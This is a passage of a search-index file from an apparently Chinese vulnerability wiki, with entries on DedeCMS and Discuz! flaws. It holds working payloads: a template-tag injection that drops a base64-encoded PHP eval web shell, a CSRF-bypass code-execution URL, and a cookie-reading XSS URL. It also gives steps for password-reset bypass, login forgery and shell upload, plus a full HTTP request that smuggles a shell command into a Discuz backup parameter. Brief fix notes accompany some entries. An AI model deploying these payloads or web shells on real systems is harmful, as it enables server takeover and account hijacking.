\u5d4c\u5165\u6076\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#dedecms-v56","text":"","title":"DedeCms v5.6 \u5d4c\u5165\u6076\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u5728\u4e0a\u4f20\u8f6f\u4ef6\u7684\u5730\u65b9\uff0c\u5bf9\u672c\u5730\u5730\u5740\u6ca1\u6709\u8fdb\u884c\u6709\u6548\u7684\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u88ab\u6076\u610f\u5229\u7528\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"DedeCms v5.6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u6ce8\u518c\u4f1a\u5458\uff0c\u4e0a\u4f20\u8f6f\u4ef6\uff1a\u672c\u5730\u5730\u5740\u4e2d\u586b\u5165\u5982\u4e0b\uff1a","title":"\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"a{/dede:link}{dede:toby57 name\\=\"']=0;phpinfo();//\"}x{/dede:toby57}\uff0c \u53d1\u8868\u540e\u67e5\u770b\u6216\u4fee\u6539\u5373\u53ef\u6267\u884c\u3002","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#exp","text":"a{/dede:link}{dede:toby57 name\\=\"']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//\"}x{/dede:toby57} \u751f\u6210x.php \u5bc6\u7801\uff1axiao\u76f4\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u3002","title":"EXP"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u77e5\u9053\u521b\u5b87\uff1a https://www.seebug.org/vuldb/ssvid-20352","title":"\u53c2\u8003"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/","text":"Dedecms V5.7\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884cCVE-2018-7700 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u8be5\u6f0f\u6d1e\u7684\u89e6\u53d1\u6587\u4ef6\u4e3a /dede/tag_test_action.php\u3002\u8d77\u56e0\u662f csrf_check() \u51fd\u6570\u7684\u7ed5\u8fc7\uff0c\u5bfc\u81f4\u53ef\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 POC \u00b6 http://localhost/\u540e\u53f0\u5730\u5740/tag_test_action.php?url=a&token=&partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field} \u5229\u7528\u6761\u4ef6 \u00b6 \u767b\u5f55\u540e\u53f0 \u89e3\u51b3\u65b9\u6848 \u00b6 \u91cd\u65b0\u5b9e\u73b0 csrf_check() \u51fd\u6570 \u53c2\u8003\u6765\u6e90 \u00b6 \u5148\u77e5\u793e\u533a\uff1a https://xz.aliyun.com/t/2224","title":"Dedecms V5.7\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884cCVE-2018-7700"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#dedecms-v57cve-2018-7700","text":"","title":"Dedecms V5.7\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884cCVE-2018-7700"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_1","text":"\u8be5\u6f0f\u6d1e\u7684\u89e6\u53d1\u6587\u4ef6\u4e3a /dede/tag_test_action.php\u3002\u8d77\u56e0\u662f csrf_check() \u51fd\u6570\u7684\u7ed5\u8fc7\uff0c\u5bfc\u81f4\u53ef\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#poc","text":"http://localhost/\u540e\u53f0\u5730\u5740/tag_test_action.php?url=a&token=&partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field}","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_2","text":"\u767b\u5f55\u540e\u53f0","title":"\u5229\u7528\u6761\u4ef6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_3","text":"\u91cd\u65b0\u5b9e\u73b0 csrf_check() \u51fd\u6570","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_4","text":"\u5148\u77e5\u793e\u533a\uff1a https://xz.aliyun.com/t/2224","title":"\u53c2\u8003\u6765\u6e90"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/","text":"Dedecms swf\u6587\u4ef6\u53cd\u5c04\u578bxss \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 DedeCMS 5.7 /images/swfupload/swfupload.swf\u6587\u4ef6movieName\u53c2\u6570\u6ca1\u6709\u5408\u9002\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c \u00b6 DedeCMS 5.7 \u6587\u4ef6\u4f4d\u7f6e \u00b6 \u6f0f\u6d1e\u6587\u4ef6\u4e3a\uff1a http://127.0.0.1/images/swfupload/swfupload.swf \u6f0f\u6d1ePOC \u00b6 http://127.0.0.1/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//","title":"Dedecms swf\u6587\u4ef6\u53cd\u5c04\u578bxss"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#dedecms-swfxss","text":"","title":"Dedecms swf\u6587\u4ef6\u53cd\u5c04\u578bxss"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_1","text":"DedeCMS 5.7 /images/swfupload/swfupload.swf\u6587\u4ef6movieName\u53c2\u6570\u6ca1\u6709\u5408\u9002\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_2","text":"DedeCMS 5.7","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_3","text":"\u6f0f\u6d1e\u6587\u4ef6\u4e3a\uff1a http://127.0.0.1/images/swfupload/swfupload.swf","title":"\u6587\u4ef6\u4f4d\u7f6e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#poc","text":"http://127.0.0.1/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/","text":"Dedecms \u524d\u53f0\u4efb\u610f\u7528\u6237\u5bc6\u7801\u4fee\u6539 \u00b6 \u5f71\u54cd\u7248\u672c \u00b6 dedecmsV5.7 SP2 \u6f0f\u6d1e\u6210\u56e0 \u00b6 \u5728\u7528\u6237\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u5904\uff0cphp \u5b58\u5728\u5f31\u7c7b\u578b\u6bd4\u8f83\uff0c\u5bfc\u81f4\u5982\u679c\u7528\u6237\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u5bc6\u4fdd\u95ee\u9898\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801(\u7ba1\u7406\u5458\u8d26\u6237\u9ed8\u8ba4\u4e0d\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898)\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4fee\u6539\u7684\u5bc6\u7801\u662f member \u8868\u4e2d\u7684\u5bc6\u7801\uff0c\u5373\u4f7f\u4fee\u6539\u4e86\u7ba1\u7406\u5458\u5bc6\u7801\u4e5f\u662f member \u8868\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u4ecd\u662f\u65e0\u6cd5\u8fdb\u5165\u7ba1\u7406\u3002 \u590d\u73b0 \u00b6 \u5728\u627e\u56de\u5bc6\u7801\u5904\uff0c\u70b9\u51fb\u901a\u8fc7\u5b89\u5168\u95ee\u9898\u53d6\u56de \u586b\u5199\u4fe1\u606f\u5e76\u6293\u5305\uff0c\u4fee\u6539 id \u548c userid \u4e3a\u60f3\u8981\u91cd\u7f6e\u5bc6\u7801\u7684\u5bf9\u8c61\uff0c\u518d\u52a0\u4e0a\u4ee5\u4e0a\u5206\u6790\u5185\u5bb9\uff0c\u53d1\u5305\u5373\u53ef\u5f97\u5230\u4fee\u6539\u5bc6\u7801 url \u8fdb\u5165\u8be5url\uff0c\u4fee\u6539\u5bc6\u7801\u3002 \u4fee\u590d\u610f\u89c1 \u00b6 \u6539\u4e3a\u5f3a\u7c7b\u578b\u6bd4\u8f83","title":"Dedecms \u524d\u53f0\u4efb\u610f\u7528\u6237\u5bc6\u7801\u4fee\u6539"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#dedecms","text":"","title":"Dedecms \u524d\u53f0\u4efb\u610f\u7528\u6237\u5bc6\u7801\u4fee\u6539"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_1","text":"dedecmsV5.7 SP2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_2","text":"\u5728\u7528\u6237\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u5904\uff0cphp \u5b58\u5728\u5f31\u7c7b\u578b\u6bd4\u8f83\uff0c\u5bfc\u81f4\u5982\u679c\u7528\u6237\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u5bc6\u4fdd\u95ee\u9898\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801(\u7ba1\u7406\u5458\u8d26\u6237\u9ed8\u8ba4\u4e0d\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898)\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4fee\u6539\u7684\u5bc6\u7801\u662f member \u8868\u4e2d\u7684\u5bc6\u7801\uff0c\u5373\u4f7f\u4fee\u6539\u4e86\u7ba1\u7406\u5458\u5bc6\u7801\u4e5f\u662f member \u8868\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u4ecd\u662f\u65e0\u6cd5\u8fdb\u5165\u7ba1\u7406\u3002","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_3","text":"\u5728\u627e\u56de\u5bc6\u7801\u5904\uff0c\u70b9\u51fb\u901a\u8fc7\u5b89\u5168\u95ee\u9898\u53d6\u56de \u586b\u5199\u4fe1\u606f\u5e76\u6293\u5305\uff0c\u4fee\u6539 id \u548c userid \u4e3a\u60f3\u8981\u91cd\u7f6e\u5bc6\u7801\u7684\u5bf9\u8c61\uff0c\u518d\u52a0\u4e0a\u4ee5\u4e0a\u5206\u6790\u5185\u5bb9\uff0c\u53d1\u5305\u5373\u53ef\u5f97\u5230\u4fee\u6539\u5bc6\u7801 url \u8fdb\u5165\u8be5url\uff0c\u4fee\u6539\u5bc6\u7801\u3002","title":"\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_4","text":"\u6539\u4e3a\u5f3a\u7c7b\u578b\u6bd4\u8f83","title":"\u4fee\u590d\u610f\u89c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/","text":"Dedecms\u4efb\u610f\u7528\u6237\u767b\u5f55SSV-97087 \u00b6 \u5f71\u54cd\u7248\u672c \u00b6 dedecmsV5.7 SP2 \u6f0f\u6d1e\u6210\u56e0 \u00b6 dedecms \u7684\u4f1a\u5458\u6a21\u5757\u7684\u8eab\u4efd\u8ba4\u8bc1\u4f7f\u7528\u7684\u662f\u5ba2\u6237\u7aef session\uff0c\u5728 Cookie \u4e2d\u5199\u5165\u7528\u6237 ID \u5e76\u4e14\u9644\u4e0a ID__ckMd5\uff0c\u7528\u505a\u7b7e\u540d\u3002\u4e3b\u9875\u5b58\u5728\u903b\u8f91\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fd4\u56de\u6307\u5b9a uid \u7684 ID \u7684 Md5 \u6563\u5217\u503c\u3002\u539f\u7406\u4e0a\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u7528\u6237\u767b\u5f55\u3002 \u590d\u73b0 \u00b6 \u73b0\u5728\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f \u5148\u4ece member/index.php \u4e2d\u83b7\u53d6\u4f2a\u9020\u7684 DedeUserID \u548c\u5b83\u5bf9\u4e8e\u7684 md5 \u4f7f\u7528\u5b83\u767b\u5f55 \u8bbf\u95ee member/index.php?uid=0000001 \u5e76\u6293\u5305(\u6ce8\u610f cookie \u4e2d last_vid \u503c\u5e94\u8be5\u4e3a\u7a7a)\u3002 \u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u83b7\u53d6\u5230\u4e86\uff0c\u62ff\u53bb\u5f53\u505aDeDeUserID \u53ef\u4ee5\u770b\u5230\uff0c\u767b\u9646\u4e86 admin \u7528\u6237\u3002 \u4fee\u590d\u610f\u89c1 \u00b6 M_ID \u88ab intval \u540e\u8fd8\u8981\u5224\u65ad\u662f\u5426\u4e0e\u672a intval \u4e4b\u524d\u76f8\u540c\u3002","title":"Dedecms\u4efb\u610f\u7528\u6237\u767b\u5f55SSV-97087"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#dedecmsssv-97087","text":"","title":"Dedecms\u4efb\u610f\u7528\u6237\u767b\u5f55SSV-97087"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_1","text":"dedecmsV5.7 SP2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_2","text":"dedecms \u7684\u4f1a\u5458\u6a21\u5757\u7684\u8eab\u4efd\u8ba4\u8bc1\u4f7f\u7528\u7684\u662f\u5ba2\u6237\u7aef session\uff0c\u5728 Cookie \u4e2d\u5199\u5165\u7528\u6237 ID \u5e76\u4e14\u9644\u4e0a ID__ckMd5\uff0c\u7528\u505a\u7b7e\u540d\u3002\u4e3b\u9875\u5b58\u5728\u903b\u8f91\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fd4\u56de\u6307\u5b9a uid \u7684 ID \u7684 Md5 \u6563\u5217\u503c\u3002\u539f\u7406\u4e0a\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u7528\u6237\u767b\u5f55\u3002","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_3","text":"\u73b0\u5728\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f \u5148\u4ece member/index.php \u4e2d\u83b7\u53d6\u4f2a\u9020\u7684 DedeUserID \u548c\u5b83\u5bf9\u4e8e\u7684 md5 \u4f7f\u7528\u5b83\u767b\u5f55 \u8bbf\u95ee member/index.php?uid=0000001 \u5e76\u6293\u5305(\u6ce8\u610f cookie \u4e2d last_vid \u503c\u5e94\u8be5\u4e3a\u7a7a)\u3002 \u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u83b7\u53d6\u5230\u4e86\uff0c\u62ff\u53bb\u5f53\u505aDeDeUserID \u53ef\u4ee5\u770b\u5230\uff0c\u767b\u9646\u4e86 admin \u7528\u6237\u3002","title":"\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_4","text":"M_ID \u88ab intval \u540e\u8fd8\u8981\u5224\u65ad\u662f\u5426\u4e0e\u672a intval \u4e4b\u524d\u76f8\u540c\u3002","title":"\u4fee\u590d\u610f\u89c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/","text":"Dedecms\u524d\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1eCVE-2018-20129 \u00b6 \u5f71\u54cd\u7248\u672c \u00b6 dedecmsV5.7 SP2 \u6f0f\u6d1e\u6210\u56e0 \u00b6 \u7ba1\u7406\u5458\u7528\u6237\u524d\u53f0\u53ef\u4ee5\u7ed5\u8fc7\u9650\u5236\u4e0a\u4f20shell \u590d\u73b0 \u00b6 \u767b\u5f55\u5e76\u8fdb\u5165 member/article\\_add.php \u53d1\u5e03\u6587\u7ae0\uff0c\u9009\u62e9\u4e0b\u9762\u7684\u5bcc\u6587\u672c\u7f16\u8f91\u5668\u63d2\u5165\u56fe\u7247 \u9009 \u62e9\u597d shell \u5e76\u4e0a\u4f20\u6293\u5305 \u5411\u5982\u4e0a\u5206\u6790\u4fee\u6539\u6587\u4ef6\u540d\u4e0econtent-type\uff0c\u5373\u53ef\u8fd4\u56de shell \u5730\u5740 \u4fee\u590d\u610f\u89c1 \u00b6 \u5728\u6700\u540e\u62fc\u63a5\u6587\u4ef6\u540d\u65f6\u518d\u5224\u65ad\u4e00\u6b21\u3002","title":"Dedecms\u524d\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1eCVE-2018-20129"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#dedecmscve-2018-20129","text":"","title":"Dedecms\u524d\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1eCVE-2018-20129"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_1","text":"dedecmsV5.7 SP2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_2","text":"\u7ba1\u7406\u5458\u7528\u6237\u524d\u53f0\u53ef\u4ee5\u7ed5\u8fc7\u9650\u5236\u4e0a\u4f20shell","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_3","text":"\u767b\u5f55\u5e76\u8fdb\u5165 member/article\\_add.php \u53d1\u5e03\u6587\u7ae0\uff0c\u9009\u62e9\u4e0b\u9762\u7684\u5bcc\u6587\u672c\u7f16\u8f91\u5668\u63d2\u5165\u56fe\u7247 \u9009 \u62e9\u597d shell \u5e76\u4e0a\u4f20\u6293\u5305 \u5411\u5982\u4e0a\u5206\u6790\u4fee\u6539\u6587\u4ef6\u540d\u4e0econtent-type\uff0c\u5373\u53ef\u8fd4\u56de shell \u5730\u5740","title":"\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_4","text":"\u5728\u6700\u540e\u62fc\u63a5\u6587\u4ef6\u540d\u65f6\u518d\u5224\u65ad\u4e00\u6b21\u3002","title":"\u4fee\u590d\u610f\u89c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"Affected Version \u00b6 Discuz! 1.5-2.5 POC \u00b6 \u9700\u8981\u767b\u5165\u540e\u53f0\u3002 \u4fee\u6539\u7684\u53c2\u6570 \u53c2\u6570 customtables[] customtables%5B%5D=pre_common_admincp_cmenu\">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php # \u6570\u636e\u5305 POST /discuz25/admin.php?action=db&operation=export&setup=1 HTTP/1.1 Host: localhost Content-Length: 252 Cache-Control: max-age=0 Origin: http://localhost Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://localhost/discuz25/admin.php?action=db&operation=export Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: _ga=GA1.1.994534325.1530166127; PHPSESSID=ffe1069f199ac7656303b61e42db4f5d; ECSCP_ID=e685eee56d5dc4a732b0b1ecb8cbac6becac2355; ECS_ID=b9e7920dfb02c84b5298d0022c64a8fc393376d7; Phpstorm-326452dc=558db1bc-7f7b-4670-8d36-9cef7d8c1b9d; ECS[visit_times]=8; 3Od_visitedfid=2; 3Od_auth=03d3WSoYgxBuC4Yg3mqq4yEVgLBDsrbNx%2F8rIcURpRI5sDFtpC1S9F%2BYa6BViyFggZYM7bac7evIAZJdgLOJ7Q; 3Od_sid=mm4AMQ; QoOR_2132_saltkey=V6AnRzmw; QoOR_2132_lastvisit=1545183584; QoOR_2132_widthauto=-1; R94S_2132_saltkey=1hs56u42; R94S_2132_lastvisit=1545220172; R94S_2132_promotion=1; R94S_2132_auth=75696lGYV1FEogy00DO%2FmyhWbxk8OljAPZAeSvxfgwvvLbMruyS2sfVSYZUG4wr3GYw5L66%2FfppgB9gzioss; R94S_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; R94S_2132_creditbase=0D0D1D0D0D0D0D0D0; R94S_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; R94S_2132_ulastactivity=e0adnKO8pY2qUt5XPBdVc3jbgQxCrCiAkAFzNuN%2Fu9wTbgHc7XLK; R94S_2132_sid=9H4E8j; R94S_2132_lastact=1545224711%09admin.php%09; QoOR_2132_sid=BdGwL9; QoOR_2132_sendmail=1; QoOR_2132_ulastactivity=9cf4%2B3XCcfF1uHee0LOFG0wa6FFvCc1Rp96Kg%2BkgOi%2FL7ovDRKru; QoOR_2132_auth=32d7SwpKowF2VAeqfqe0dWo1FjINHjZA9zt%2ByF8A7LOif0pFSaHnEznijiCaqgsQD8NSBtEiwEDL4Wrnx1gz; QoOR_2132_checkpatch=1; QoOR_2132_checkupgrade=1; QoOR_2132_lastact=1545224853%09admin.php%09 Connection: close formhash=0d2eaac0&scrolltop=&anchor=&type=custom&customtables%5B%5D=pre_common_admincp_cmenu\">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #&method=shell&extendins=0&sqlcompat=&usehex=1&usezip=0&filename=181219_u0CC19kJ&exportsubmit=%E6%8F%90%E4%BA%A4 References \u00b6 https://paper.seebug.org/763/ https://github.com/FoolMitAh/CVE-2018-14729","title":"Discuz! 1.5 2.5 \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#affected-version","text":"Discuz! 1.5-2.5","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"\u9700\u8981\u767b\u5165\u540e\u53f0\u3002 